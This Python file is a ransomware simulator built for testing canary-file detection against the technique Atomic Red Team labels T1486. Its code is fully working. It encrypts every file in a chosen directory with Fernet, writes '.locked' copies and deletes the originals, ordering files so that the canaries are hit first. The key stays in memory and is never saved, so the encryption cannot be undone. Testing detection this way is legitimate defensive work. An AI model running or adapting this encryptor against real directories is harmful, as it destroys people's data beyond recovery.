"""
T1486 Ransomware Simulator: Simulates Atomic Red Team T1486 (Data Encrypted for Impact).
Traverses directory trees in NTFS lexicographical sort order, encrypts file contents,
renames with '.locked', and responds immediately to termination signals.
"""

from dataclasses import dataclass, field
import os
from pathlib import Path
import threading
import time
from typing import Callable, List, Optional
from cryptography.fernet import Fernet


@dataclass
class EncryptionEvent:
    file_path: str
    is_canary: bool
    timestamp: float
    elapsed_ms: float


@dataclass
class AttackStats:
    start_time: float = 0.0
    stop_time: float = 0.0
    first_canary_touch_time: Optional[float] = None
    first_canary_path: Optional[str] = None
    encrypted_canaries: int = 0
    encrypted_user_files: int = 0
    total_files_encrypted: int = 0
    was_terminated: bool = False
    events: List[EncryptionEvent] = field(default_factory=list)


class T1486RansomwareSimulator:
    CANARY_PREFIXES = ("!000_", "#000_", "$000_", "_000_")

    def __init__(
        self,
        target_dir: Path,
        delay_ms: int = 15,
        on_file_encrypted: Optional[Callable[[EncryptionEvent], None]] = None,
    ):
        self.target_dir = Path(target_dir).resolve()
        self.delay_ms = max(0, delay_ms)
        self.on_file_encrypted = on_file_encrypted
        self._stop_event = threading.Event()
        self.stats = AttackStats()
        self.cipher_key = Fernet.generate_key()
        self.cipher = Fernet(self.cipher_key)
        self._thread: Optional[threading.Thread] = None

    def is_canary(self, path: Path) -> bool:
        name = path.name
        return any(name.startswith(p) for p in self.CANARY_PREFIXES)

    def terminate(self) -> None:
        """Signal immediate termination of the adversary process/thread."""
        self._stop_event.set()
        self.stats.was_terminated = True
        if not self.stats.stop_time:
            self.stats.stop_time = time.perf_counter()

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def get_candidate_files_lexicographical(self) -> List[Path]:
        """
        Enumerate all candidate files across target directories in strict
        NTFS/FindFirstFileW lexicographical sort order.
        """
        all_files: List[Path] = []
        if not self.target_dir.exists():
            return all_files

        # Sort subdirectories first, then sort files within each directory
        subdirs = sorted([d for d in self.target_dir.iterdir() if d.is_dir()])
        if not subdirs:
            subdirs = [self.target_dir]

        for sdir in subdirs:
            folder_files = [
                f for f in sdir.iterdir() if f.is_file() and not f.name.endswith(".locked")
            ]
            # ASCII sort order forces '!', '#', '$' canaries to index 0
            folder_files.sort(key=lambda p: p.name)
            all_files.extend(folder_files)

        return all_files

    def run(self) -> AttackStats:
        """Execute the T1486 encryption attack loop."""
        self._stop_event.clear()
        self.stats = AttackStats()
        self.stats.start_time = time.perf_counter()

        candidate_files = self.get_candidate_files_lexicographical()

        for fpath in candidate_files:
            if self._stop_event.is_set():
                self.stats.was_terminated = True
                break

            canary_hit = self.is_canary(fpath)
            now = time.perf_counter()

            if canary_hit and self.stats.first_canary_touch_time is None:
                self.stats.first_canary_touch_time = now
                self.stats.first_canary_path = str(fpath)

            try:
                # Read content, encrypt with Fernet, write back, and rename to .locked
                with open(fpath, "rb") as f:
                    content = f.read()

                encrypted_data = self.cipher.encrypt(content)
                locked_path = fpath.with_name(f"{fpath.name}.locked")

                with open(locked_path, "wb") as f:
                    f.write(encrypted_data)

                # Remove original plaintext file
                fpath.unlink(missing_ok=True)

                elapsed_ms = (time.perf_counter() - self.stats.start_time) * 1000.0

                if canary_hit:
                    self.stats.encrypted_canaries += 1
                else:
                    self.stats.encrypted_user_files += 1
                self.stats.total_files_encrypted += 1

                event = EncryptionEvent(
                    file_path=str(locked_path),
                    is_canary=canary_hit,
                    timestamp=now,
                    elapsed_ms=elapsed_ms,
                )
                self.stats.events.append(event)

                if self.on_file_encrypted:
                    self.on_file_encrypted(event)

            except Exception:
                # If interrupted or locked by OS
                pass

            if self._stop_event.is_set():
                self.stats.was_terminated = True
                break

            # Pacing latency between files
            if self.delay_ms > 0:
                # Sleep in short increments to remain responsive to immediate termination
                steps = max(1, self.delay_ms // 2)
                step_sleep = (self.delay_ms / 1000.0) / steps
                for _ in range(steps):
                    if self._stop_event.is_set():
                        break
                    time.sleep(step_sleep)

        if not self.stats.stop_time:
            self.stats.stop_time = time.perf_counter()

        return self.stats

    def start_async(self) -> threading.Thread:
        """Start the simulator in a background worker thread."""
        self._thread = threading.Thread(target=self.run, name="T1486-Ransomware-Thread", daemon=True)
        self._thread.start()
        return self._thread


if __name__ == "__main__":
    import sys

    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("./sandbox_drive")
    sim = T1486RansomwareSimulator(target, delay_ms=10)
    print(f"Starting T1486 attack on {target}...")
    res = sim.run()
    print(
        f"Attack complete. Encrypted {res.total_files_encrypted} files (Canaries: {res.encrypted_canaries}, User files: {res.encrypted_user_files}). Terminated: {res.was_terminated}"
    )
